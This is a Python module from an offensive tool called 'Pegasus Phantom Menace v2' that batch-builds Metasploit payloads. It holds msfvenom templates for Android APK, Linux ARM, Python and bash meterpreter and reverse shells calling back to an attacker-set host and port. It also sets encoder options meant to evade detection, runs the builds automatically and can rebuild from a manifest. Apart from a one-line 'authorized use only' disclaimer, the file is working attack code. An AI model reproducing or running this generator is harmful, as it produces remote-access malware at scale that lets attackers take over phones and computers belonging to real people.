"""
Pegasus Phantom Menace v2 - Mass Payload Generator

Builds a family of payloads across ports, formats and encoders in one pass, so
an engagement does not stall waiting on one-off msfvenom invocations. Each
build is stamped with a DNA tag (see :mod:`dna`) unless tagging is disabled.

When ``msfvenom`` is on PATH the real binaries are produced. Otherwise a
per-payload generator script is written that reproduces the exact command, so
the batch can be compiled later on a host that has Metasploit installed.

All use is for authorized security research and penetration testing only.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import time
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional

from . import dna

FORMATS: Dict[str, Dict[str, Any]] = {
    "android": {
        "extension": ".apk",
        "template": [
            "msfvenom", "-p", "android/meterpreter/reverse_tcp",
            "LHOST={lhost}", "LPORT={port}", "-o", "{output}",
        ],
        "requires": ["android"],
    },
    "android-https": {
        "extension": ".apk",
        "template": [
            "msfvenom", "-p", "android/meterpreter/reverse_https",
            "LHOST={lhost}", "LPORT={port}", "-o", "{output}",
        ],
        "requires": ["android"],
    },
    "linux": {
        "extension": "",
        "template": [
            "msfvenom", "-p", "linux/armle/meterpreter/reverse_tcp",
            "LHOST={lhost}", "LPORT={port}", "-o", "{output}",
        ],
        "requires": ["linux"],
    },
    "python": {
        "extension": ".py",
        "template": [
            "msfvenom", "-p", "python/meterpreter/reverse_tcp",
            "LHOST={lhost}", "LPORT={port}", "-o", "{output}",
        ],
        "requires": ["python"],
    },
    "bash": {
        "extension": ".sh",
        "template": [
            "msfvenom", "-p", "cmd/unix/reverse_bash",
            "LHOST={lhost}", "LPORT={port}", "-o", "{output}",
        ],
        "requires": ["shell"],
    },
}

ENCODERS: Dict[str, Optional[str]] = {
    "none": None,
    "shikata": "x86/shikata_ga_nai",
    "alpha-mixed": "x86/alpha_mixed",
}

MAX_BATCH = 64


class MassPayloadError(RuntimeError):
    """Raised for invalid batch parameters."""


@dataclass
class PayloadBuild:
    index: int
    name: str
    format: str
    lhost: str
    port: int
    encoder: Optional[str]
    output: str
    command: List[str]
    built: bool
    dna_tag: Optional[str] = None
    error: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class BatchResult:
    lhost: str
    target: str
    campaign: str
    started_at: str
    finished_at: str
    msfvenom: bool
    builds: List[PayloadBuild] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        data = asdict(self)
        data["builds"] = [build.to_dict() for build in self.builds]
        data["built"] = sum(1 for build in self.builds if build.built)
        return data


def msfvenom_available() -> bool:
    return shutil.which("msfvenom") is not None


def _render(template: List[str], lhost: str, port: int, output: Path, encoder: Optional[str]) -> List[str]:
    command = [part.format(lhost=lhost, port=port, output=str(output)) for part in template]
    if encoder:
        command += ["-e", encoder, "-i", "3"]
    return command


def _generator_script(build: PayloadBuild) -> str:
    quoted = " ".join(f'"{part}"' if " " in part else part for part in build.command)
    return (
        "#!/usr/bin/env bash\n"
        "# Pegasus mass payload generator - run on a host with Metasploit\n"
        f"set -e\n{quoted}\n"
    )


def generate_batch(
    lhost: str,
    start_port: int = 4444,
    count: int = 5,
    formats: Optional[List[str]] = None,
    encoders: Optional[List[str]] = None,
    output_dir: str | Path = "~/.pegasus/payloads/mass",
    target: str = "",
    campaign: str = "mass",
    tag_dna: bool = True,
    timeout: int = 180,
) -> Dict[str, Any]:
    """
    Generate ``count`` payloads, rotating formats and encoders.

    Ports increment from ``start_port``. Returns a manifest dictionary that is
    also written to ``manifest.json`` beside the builds.
    """
    if count < 1 or count > MAX_BATCH:
        raise MassPayloadError(f"count must be 1..{MAX_BATCH}")
    chosen_formats = formats or ["android", "android-https", "python", "bash", "linux"]
    unknown = [name for name in chosen_formats if name not in FORMATS]
    if unknown:
        raise MassPayloadError(f"Unknown format(s): {', '.join(unknown)}")
    chosen_encoders = encoders or ["none"]
    unknown_enc = [name for name in chosen_encoders if name not in ENCODERS]
    if unknown_enc:
        raise MassPayloadError(f"Unknown encoder(s): {', '.join(unknown_enc)}")

    out_dir = Path(output_dir).expanduser()
    out_dir.mkdir(parents=True, exist_ok=True)
    have_msf = msfvenom_available()

    batch = BatchResult(
        lhost=lhost,
        target=target,
        campaign=campaign,
        started_at=time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        finished_at="",
        msfvenom=have_msf,
    )

    for index in range(count):
        fmt = chosen_formats[index % len(chosen_formats)]
        encoder_name = chosen_encoders[index % len(chosen_encoders)]
        encoder = ENCODERS[encoder_name]
        port = start_port + index
        spec = FORMATS[fmt]
        name = f"payload_{index + 1:02d}_{fmt.replace('-', '_')}_port{port}{spec['extension']}"
        output = out_dir / name
        command = _render(spec["template"], lhost, port, output, encoder)

        build = PayloadBuild(
            index=index + 1,
            name=name,
            format=fmt,
            lhost=lhost,
            port=port,
            encoder=encoder,
            output=str(output),
            command=command,
            built=False,
        )

        if have_msf:
            try:
                proc = subprocess.run(command, capture_output=True, text=True, timeout=timeout)
                build.built = proc.returncode == 0 and output.exists()
                if not build.built:
                    build.error = (proc.stderr or proc.stdout or "msfvenom failed").strip()[:400]
            except subprocess.TimeoutExpired:
                build.error = f"timed out after {timeout}s"
            except OSError as exc:
                build.error = str(exc)
        else:
            script = out_dir / (name + ".generate.sh")
            script.write_text(_generator_script(build), encoding="utf-8")
            try:
                os.chmod(script, 0o755)
            except OSError:
                pass
            build.error = "msfvenom not on PATH; generator script written"

        if tag_dna and build.built:
            record = dna.generate_tag(
                output,
                target=target or lhost,
                campaign=campaign,
                notes=f"mass batch index {build.index}",
            )
            build.dna_tag = record["tag"]

        batch.builds.append(build)

    batch.finished_at = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
    manifest = batch.to_dict()
    manifest["output_dir"] = str(out_dir)
    (out_dir / "manifest.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    manifest["manifest"] = str(out_dir / "manifest.json")
    return manifest


def rebuild_from_manifest(manifest_path: str | Path, timeout: int = 180) -> Dict[str, Any]:
    """Re-run every recorded command in a manifest (useful on a Metasploit host)."""
    data = json.loads(Path(manifest_path).expanduser().read_text(encoding="utf-8"))
    built = 0
    for build in data.get("builds", []):
        proc = subprocess.run(build["command"], capture_output=True, text=True, timeout=timeout)
        if proc.returncode == 0:
            built += 1
    return {"requested": len(data.get("builds", [])), "built": built}


__all__ = [
    "FORMATS",
    "ENCODERS",
    "MassPayloadError",
    "msfvenom_available",
    "generate_batch",
    "rebuild_from_manifest",
]
